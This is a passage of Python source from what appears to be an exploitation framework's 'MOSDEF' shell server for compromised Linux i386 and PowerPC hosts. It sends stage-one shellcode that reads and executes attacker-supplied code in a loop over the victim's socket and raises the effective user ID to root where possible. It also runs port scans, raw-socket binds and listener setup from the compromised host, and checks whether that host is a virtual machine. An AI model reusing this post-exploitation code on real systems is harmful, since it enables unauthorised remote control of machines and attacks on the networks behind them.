            print "Protocol not recognized"
            return -1
        return self.connect_sock(fd,host,port,proto,timeout)

    def connect_sock(self,fd,host,port,proto,timeout):
        """
        Does a tcp connect with a timeout
        """
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_ERROR" as "SO_ERROR"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "int", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"
        #include "socket.h"
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "select" as "select"
        #import "local", "memset" as "memset"
        //#import "local", "debug" as "debug"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "local", "getsockopt" as "getsockopt"

        struct timeval {
                int tv_sec;
                int tv_usec; 
        };

        void main()
        {
          int mask[32];
          int tmpmask;
          int i;
          int ret;
          int ilen;
          int div;
          int n;
          int sockopt;
          int fdindex;
          int opts;
          struct timeval tv;
          struct sockaddr_in serv_addr;
          serv_addr.family=AF_INET; //af_inet
          
          //sockfd is set on MOSDEFSock init
          //sockfd=socket(AF_INET,SOCK_STREAM,0);

          //debug();
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);

          tv.tv_usec= 0;
          tv.tv_sec = timeout;

          memset(&mask, 0, 128);
          // we don't have a modulus so doing it like this
          fdindex = 0;
          if (sockfd > 31) {
              fdindex = sockfd;
              while (fdindex > 31) {
                  fdindex = fdindex - 32;
              } 
          }
          else {
              fdindex = sockfd;
          }
          i = 0;
          div = sockfd;
          // we didnt do '/' yet when i wrote this
          while (div > 31)
          {
              i = i+1;
              div = div - 32;
          }
          //debug();
          mask[i] = 1<<fdindex;

          // set to non-blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts | O_NONBLOCK;
          fcntl(sockfd, F_SETFL, opts);

          ret = connect(sockfd,&serv_addr,16);
          // a bit botched, would be cleaner with errno
          //debug();
          // handle EINPROGRESS errno ony
          // we get away with this because our 'libc' is direct syscalls ;)
          // so errno is still in eax
          if (ret < 0) {
              if (ret == -115) {
                  n = sockfd + 1;
                  //debug();
                  i=select(n, 0, &mask, 0, &tv);
                  if (i > 0) {
                       sockopt = 0;
                       // assuming x86 linux
                       ilen = 4;
                       getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sockopt, &ilen);
                       if (sockopt) {
                           // error occurred on socket
                           sendint(-1);
                           return;
                       } 
                  }
                  // timeout or error
                  else {
                       sendint(-2);
                       return;
                  }
              }
              // some other errno was set
              else {
                  sendint(-1);
                  return;
              }
          }
      
          // connect (with timeout) succeeded 
      
          // set back to blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts & O_BLOCK;
          fcntl(sockfd, F_SETFL, opts);
          sendint(0);
        }
        """

        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        vars = self.libc.getdefines()
        vars["ip"]=hostlong
        vars["port"]=port
        vars["proto"]=proto
        vars["sockfd"]=fd
        vars["timeout"]=timeout

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()

        return ret

    def bindraw(self, interface='eth0', protocol=0x01):
        """ binds and returns a raw linklayer level socket 
            returns -1 on failure
        """

        code="""
        #include <sys/socket.h>
        #include <net/if.h>

        #import "local", "socket" as "socket"
        #import "local", "ioctl" as "ioctl"
        #import "local", "bind" as "bind"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "local", "strcpy" as "strcpy"
        #import "local", "memset" as "memset"

        #import "int", "SOCK_RAW" as "SOCK_RAW"
        #import "int", "AF_PACKET" as "AF_PACKET"
        #import "int", "PROTOCOL" as "PROTOCOL"
        #import "int", "SIOCGIFINDEX" as "SIOCGIFINDEX"

        #import "string", "INTERFACE" as "INTERFACE"

        void
        main()
        {
            // XXX: needs full ifreq struct in C_headers still .. but will do for now
            struct ifreq ifr;
            struct sockaddr_ll sock;

            int s;
            int ret;

            // def socket() can replace this call but whatev ..
            s = socket(AF_PACKET, SOCK_RAW, PROTOCOL);

            memset(&ifr, 0, 36); 
            // XXX: adjust size as struct changes (C_headers.py)
            // overflow if input from remote .. plz not input from remote lol kthx
            strcpy(ifr.ifr_name, INTERFACE);
            
            // get the interface index for interface
            ret = ioctl(s, SIOCGIFINDEX, &ifr); 
            if (ret < 0)
            {
                sendint(-1);
            }

            // fill the link layer address struct
            sock.sll_family = AF_PACKET;
            sock.sll_protocol = PROTOCOL;
            sock.sll_ifindex = ifr.ifr_index;
            sock.sll_pkttype = 0; // PACKET_HOST

            // zero out address muck
            sock.sll_halen = 0;
            memset(sock.sll_addr, 0, 8);
 
            // XXX: check with strace
            ret = bind(s, &sock, 20);
            if (ret < 0)
            {
                sendint(-1);
            } 
            else
            {
                sendint(s);
            } 
        }

        """

        vars = self.libc.getdefines()

        vars['PROTOCOL'] = socket.htons(protocol)
        # make sure to nul term strings for internal strcpy :>
        vars['INTERFACE'] = interface + '\x00'

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        
        return ret

    #### non-libc like things. Advanced modules. Etc. ####
          
    def getListenSock(self,addr,port):
        """
        Creates a tcp listener socket fd on a port
        """
        vars={}
        code="""
        #import "local", "bind" as "bind"
        #import "local", "listen" as "listen"
        #import "local", "socket" as "socket"
        #import "local", "setsockopt" as "setsockopt"
        #import "local", "close" as "close"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "int", "addr" as "addr"
        //#import "local", "debug" as "debug"
        #import "int", "port" as "port"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_REUSEADDR" as "SO_REUSEADDR"
        #include "socket.h"
        
        void main()
        {
            int sockfd;
            int i;
            struct sockaddr_in serv_addr;
          
            serv_addr.family=AF_INET; //af_inet
          
            serv_addr.port=htons(port);
            serv_addr.addr=addr;
            sockfd = socket(AF_INET,SOCK_STREAM,0);

            // XXX: because we leave errno in eax negative .. always check < 0, not == -1

            if (sockfd < 0) {
                sockfd = -3; // failed to create the socket 
            } else {
                i = 1;
                setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &i, 4); // XXX optval?
                i = bind(sockfd,&serv_addr,16);
                if (i < 0) {
                    close(sockfd);
                    sockfd = -1; // failed to bind
                } else {
                    i = listen(sockfd,16);
                    if (i < 0) {
                        close(sockfd);
                        sockfd = -2; // filed to listen
                    }
                }
            }
            sendint(sockfd); //success
        }
        """
        vars = self.libc.getdefines()
        vars["port"]=port
        # XXX for now str2littleendian -> self.libc.endianorder
        vars["addr"]=self.libc.endianorder(socket.inet_aton(addr))
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readint(signed=True)
        self.leave()

        return fd

    def tcpConnectScan(self,network,startport=1,endport=1024):
        """
        Connectscan from the remote host! 
        """

        openports = []
        if network.count("/"):
            network,netmask=network.split("/")
        else:
            netmask=32
        netmask=int(netmask)

        hostlong=socket.gethostbyname(network) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        numberofips=2**(32-netmask) #how many ip's total
        startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things

        vars = self.libc.getdefines()
        vars["startip"]=startip
        vars["numberofips"]=numberofips
        vars["startport"]=startport
        vars["endport"]=endport
        code="""
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "debug" as "debug"
        #import "int", "startip" as "startip"         
        #import "int", "startport" as "startport"
        #import "int", "endport" as "endport"
        #import "int", "numberofips" as "numberofips"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #include "socket.h"
        
        void main()
        {
          int currentport;
          int sockfd;
          int fd;
          int doneips;
          int currentip;
          
          struct sockaddr_in serv_addr;
          
          serv_addr.family=AF_INET; //af_inet
          currentip=startip;
          doneips=0;
           
          while (doneips<numberofips)
          {
               //FOR EACH IP...
               doneips=doneips+1;
               serv_addr.addr=htonl(currentip);
               currentport=startport;
               while (currentport<endport) {
                 //FOR EACH PORT
                 //debug();
                 sockfd=socket(AF_INET,SOCK_STREAM,0);
                 //debug();
                 serv_addr.port=htons(currentport);
                 if (connect(sockfd,&serv_addr,16)==0) {
                   //sendint(23);
                   sendint(currentport);
                 }
                 //debug();
                 //sendint(22);
                 close(sockfd);
                 //sendint(20);
                 currentport=currentport+1;
                 //sendint(21);
                }
               currentip=currentip+1;
          }
         sendint(0xffffffff);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        port = 0
        while port!=-1:
            port=self.readint()
            if port!=-1:
                openports.append(port)
        self.leave()
        return openports

    def tcpportscan(self,args):
        """ 
        TCP Connect scan from the remote host.
        Args: network to scan, startport, endport
        """
        argsL = args.split(" ")
        return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]))

#### END OF GLOBAL FUNCTION DEFINES ####


#
# was previously 'linuxshellserver'
#
# TODO: follow Linux_ppc example
#

from MOSDEF.linuxremoteresolver import x86linuxremoteresolver
class Linux_i386(LinuxShellServer, x86linuxremoteresolver):
    """
    this is the linux MOSDEF Shell Server class
    """
    
    def __init__(self,connection,node,logfunction=None, proctype='i386'):
        x86linuxremoteresolver.__init__(self)
        unixshellserver.__init__(self,connection,type="Active",logfunction=logfunction)
        MSSgeneric.__init__(self, 'x86')
        self.libraryDict={}
        self.functionDict={}
        self.order=intel_order
        self.unorder=istr2int
        self.perror=linux_perror
        self.node=node
        self.node.shell=self
        self.started = 0
     
    def xx_writeint(self,word):
        data = intel_order(word)
        self.writebuf(data)
        return
     
    def setListenPort(self,port):
        self.listenport=port
        return
    
    def getASMDefines(self):
        return ""
  
    def assemble(self,code):
        return ""

    def startup(self):
        """
        this function is called by the engine and by self.run()
        we are ready to rock!
        Our stage one shellcode just reads in a word, then reads in that much data
        and executes it
        First we send some shellcode to get the socket register
        Then we send some shellcode to establish our looping server
        """
        if self.started:
            return 0

        if hasattr(self.connection, "set_timeout"):
            self.connection.set_timeout(10)
        else:
            self.log("Not using timeoutsocket on this node")
        
        if hasattr(self, 'known_fd'):
            self.fd = self.known_fd
        else:
            sc=shellcodeGenerator.linux_X86()
            sc.addAttr("sendreg",{"fdreg":"ebx","regtosend":"ebx"})
            sc.addAttr("read_and_exec",{"fdreg":"ebx"})
            getfd=sc.get()
            self.log("Sending request of length %d to get FD"%len(getfd))
            self.sendrequest(getfd)
            #now read in our little endian word that is our fd (originally in ebx)
            self.fd=self.readword()
            self.known_fd = self.fd
            self.leave()
        self.log("Self.fd=%d"%self.fd)
        self.set_fd(self.fd)
        self.libc.initStaticFunctions({'fd': self.fd})
        # XXX: because we operate on a copy of the libc localfunctions inside remote resolver
        # XXX: we must now update the remote resolver copy of the localfunctions with a new copy
        self.localfunctions = self.libc.localfunctions.copy()
        self.initLocalFunctions()
      
        sc=shellcodeGenerator.linux_X86()
        sc.addAttr("Normalize Stack",[500])
        sc.addAttr("read_and_exec_loop",{"fd":self.fd})
        mainloop=sc.get()        
        self.sendrequest(mainloop)
        self.leave()
        #ok, now our mainloop code is running over on the other side
        self.log("Set up Linux dynamic linking assembly component server")
        self.initLocalFunctions()
        #At this point MOSDEF is up and running
        self.log("Initialized Local Functions.")
        self.log("Resetting signal handlers...")
        SIGCHLD = self.libc.getdefine('SIGCHLD')
        SIG_DFL = self.libc.getdefine('SIG_DFL')
        SIGPIPE = self.libc.getdefine('SIGPIPE')
        SIG_IGN = self.libc.getdefine('SIG_IGN')
        self.log("Reset SIGCHLD")
        self.signal(SIGCHLD, SIG_DFL)
        self.log("Ignoring SIGPIPE")
        self.signal(SIGPIPE, SIG_IGN)

        self.log("Getting UIDs");
        (uid,euid,gid,egid) = self.ids()
        self.uid = uid # so we get a nice little '#' prompt from NodePrompt on uid 0

        if euid!=0 and uid==0:
            self.log("Setting euid to 0...")
            self.seteuid(0)
        #here we set the timout to None, since we know the thing works...(I hope)
        self.connection.set_timeout(None)
        self.setInfo("Linux MOSDEF ShellServer. Remote host: %s"%("*"+str(self.getRemoteHost())+"*"))
        self.setProgress(100)
        self.started=1
        return 1
    
    # XXX: i386 linux stat(2) returns struct stat (include/asm/stat.h)
    def stat(self, filename):
        return self.__xstat(filename, mode = "stat")

    def fstat(self, fd):
        return self.__xstat(fd, mode = "fstat")

    def __xstat(self, arg, mode = "fstat"):
        """
        runs [f]stat
        """

        vars={}
        if mode == "fstat":
            d = ("fstat", "int", "fd")
        elif mode == "stat":
            d = ("stat", "string", "filename")
        else:
            raise AssertionError, "mode is %s" % mode
        vars[d[2]] = arg

        code="""
        #include <sys/stat.h>
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","%s" as "%s"
        #import "%s", "%s" as "%s"
        void main()
        {
             struct stat buf;
             int ret;
             
             ret=%s(%s,&buf);
             sendint(ret);
             if (ret==0) {
              //success
              sendshort(buf.st_dev);
              sendint(buf.st_ino);
              sendshort(buf.st_mode);
              sendshort(buf.st_nlink);
              sendshort(buf.st_uid);
              sendshort(buf.st_gid);
              sendshort(buf.st_rdev);
              sendint(buf.st_size);
              sendint(buf.st_blksize);
              sendint(buf.st_blocks);
              sendint(buf.st_atime);
              sendint(buf.st_mtime);
              sendint(buf.st_ctime);
              }
        }
        """ % (d[0], d[0], d[1], d[2], d[2], d[0], d[2])
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        statbuf=None
        if ret==0:
            #success
            statbuf=self.readstruct([("s","st_dev"),
                                     ("l","st_ino"),
                                     ("s","st_mode"),
                                     ("s","st_nlink"),
                                     ("s","st_uid"),
                                     ("s","st_gid"),
                                     ("s","st_rdev"),
                                     ("l","st_size"),
                                     ("l","st_blksize"),
                                     ("l","st_blocks"),
                                     ("l","st_atime"),
                                     ("l","st_mtime"),
                                     ("l","st_ctime")])
                                        
         #print "Ret=%s"%ret
        self.leave()        
        return ret,statbuf
               
    #### i386 Shellcode functions below ####

    # XXX: this is i386 specific ! keep it here ;)
    def checkvm(self):
        "checks if we're inside a VM by checking for a relocated idt"
        print "[!] Checking if we're inside a VirtualMachine"
        vars = {}
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "checkvm" as "checkvm"

        void
        main()
        {
            int i;
            i = checkvm();
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        if not ret:
            print "[!] Looks like we're on real hardware :)"
        else:
            print "[!] Looks like we're on virtual hardware :("
        self.leave()
        return ret

    #### dependent on local var functions ###

    def shutdown(self):
        """
        close the socket
        """
        self.connection.close()
        return

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        print "Recieving %d bytes from fd %d"%(length,fd)
        message = self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength = 0
        ret = []
        #reliable recv
        buffer=self.node.parentnode.recv(self.connection,length)
        self.leave()
        return buffer
     
#### NEW CLASS - PPC ####
     
from linuxremoteresolver import ppclinuxremoteresolver
class Linux_ppc(LinuxShellServer, ppclinuxremoteresolver):
    
    proctype = "PowerPC"
    
    def __init__(self, connection, node, version = "2.6", logfunction = None, initialisedFD = None):
        ppclinuxremoteresolver.__init__(self, version)
        unixshellserver.__init__(self, connection, type="Active", logfunction = logfunction)
        MSSgeneric.__init__(self, self.proctype)
        self.libraryDict = {}
        self.functionDict = {}
        self.remotefunctioncache = {}
        self.node = node
        self.node.shell = self
        self.started = 0
    
    def startup(self):
        if self.started:
            return 0
        self.connection.set_timeout(None)
        
        sc = shellcodeGenerator.linux_ppc()
        if isdebug('linuxshellserver::startup::shellcode_attach'):
            print "attach and press <enter>"
            sys.stdin.read(1)

        if hasattr(self, 'initialisedFD') and self.initialisedFD != None:
            self.fd = self.initialisedFD
        else:
            sc.addAttr("sendreg", {'fdreg': "r28", 'regtosend': "r28"})
            #print shellcode_dump(sc.get(), mode="Risc")
            sc.addAttr("read_exec", {'fdreg': "r28"})
            #print shellcode_dump(sc.get(), mode="Risc")
            getfd = sc.get()
            print shellcode_dump(getfd, mode="Risc")
            self.sendrequest(getfd)
            self.fd = self.readword()
            self.initialisedFD = self.fd
            self.leave()

        self.log("Self.fd=%d" % self.fd)
        self.libc.initStaticFunctions({'fd': self.fd})
        # XXX: because we operate on a copy of the libc localfunctions inside remote resolver
        # XXX: we must now update the remote resolver copy of the localfunctions with a new copy
        self.localfunctions = self.libc.localfunctions.copy()
        # XXX: we must re-call initLocalFunctions to update the rr again ..
        self.initLocalFunctions()

        sc = shellcodeGenerator.linux_ppc()
        sc.addAttr("read_exec_loop", {'fdreg': "r28", 'fdval': self.fd})
        mainloop = sc.get()
        print shellcode_dump(sc.get(), mode="Risc")
        self.log("mainloop length=%d" % len(mainloop))
        self.sendrequest(mainloop)
        self.leave()
        
        # XXX move to generic
        SIGCHLD = self.libc.getdefine('SIGCHLD')
        SIG_DFL = self.libc.getdefine('SIG_DFL')
        SIGPIPE = self.libc.getdefine('SIGPIPE')
        SIG_IGN = self.libc.getdefine('SIG_IGN')
        self.log("Reset SIGCHLD")
        self.signal(SIGCHLD, SIG_DFL)
        self.log("Ignoring SIGPIPE")
        self.signal(SIGPIPE, SIG_IGN)

        (uid,euid,gid,egid) = self.ids()
        self.uid = uid # so we get a nice little '#' prompt from NodePrompt on uid 0
        
        self.setInfo("Linux/ppc MOSDEF ShellServer. Remote host: %s" % ("*" + str(self.getRemoteHost()) + "*"))
        self.setProgress(100)
        self.started = 1
        return 1

    def stat(self, filename):
        return self.__xstat(filename, mode = "stat")

    def fstat(self, fd):
        return self.__xstat(fd, mode = "fstat")

    def __xstat(self, arg, mode = "fstat"):
        """
        runs [f]stat
        """

        vars={}
        if mode == "fstat":
            d = ("fstat", "int", "fd")
        elif mode == "stat":
            d = ("stat", "string", "filename")
        else:
            raise AssertionError, "mode is %s" % mode
        vars[d[2]] = arg

        code="""
        #include <sys/stat.h>
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","%s" as "%s"
        #import "%s", "%s" as "%s"

        void main()
        {
             // stat is MOSDEFLibc/asm/arch.py dependent!
             struct stat buf;
             int ret;
             int *i;
             
             ret = %s(%s, &buf);
             sendint(ret);
             if (ret == 0) 
             {
               // XXX: mosdef can't handle struct.member[index] yet :(
               // XXX: to fix do like: i = struct.member; i[index]
               sendint(buf.st_dev);
               sendint(buf.st_ino);
               sendint(buf.st_mode);
               sendint(buf.st_nlink);
               sendint(buf.st_uid);
               sendint(buf.st_gid);
               sendint(buf.st_rdev);
               sendint(buf.st_size);
               sendint(buf.st_blksize);
               sendint(buf.st_blocks);
               sendint(buf.st_atime);
               sendint(buf.st_mtime);
               sendint(buf.st_ctime);
             }
        }
        """ % (d[0], d[0], d[1], d[2], d[2], d[0], d[2])
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        statbuf = None
        if ret == 0:
            statbuf = self.readstruct([("l","st_dev"),
                                      ("l","st_ino"),
                                      ("l","st_mode"),
                                      ("l","st_nlink"),
                                      ("l","st_uid"),
                                      ("l","st_gid"),
                                      ("l","st_rdev"),
                                      ("l","st_size"),
                                      ("l","st_blksize"),
                                      ("l","st_blocks"),
                                      ("l","st_atime"),
                                      ("l","st_mtime"),
                                      ("l","st_ctime")])
                                        
        self.leave()        
        return ret,statbuf

    #### dependent on local var functions ###

    def shutdown(self):
        """
        close the socket
        """
        self.connection.close()
        return

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        #print "Receiving %d bytes from fd %d"%(length,fd)
        message = self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength = 0
        ret = []
        buffer = self.node.parentnode.recv(self.connection, length)
        self.leave()

        return buffer
     
